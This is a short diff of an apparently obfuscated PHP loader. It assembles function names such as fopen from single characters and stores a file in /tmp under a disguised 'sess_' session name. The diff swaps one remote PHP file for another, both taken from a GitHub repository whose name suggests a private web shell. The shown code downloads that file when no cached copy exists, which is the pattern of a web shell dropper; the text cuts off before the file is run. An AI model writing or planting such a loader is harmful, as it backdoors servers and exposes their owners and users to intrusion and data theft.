@@ -5,7 +5,7 @@ $fo = "f" . "o" . "p" . "e" . "n";
 $fc = "f" . "c" . "l" . "o" . "s" . "e";
 
 $memeklodon = 'sess_' . md5('nax') . '.php';
-$mysql = ['https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php', "/tmp/$memeklodon"];
+$mysql = ['https://raw.githubusercontent.com/zer04lone/shellpribadi/main/rimuru.php', "/tmp/$memeklodon"];
 
 if (!file_exists($mysql[1]) || filesize($mysql[1]) === 0) {
     $context = stream_context_create([
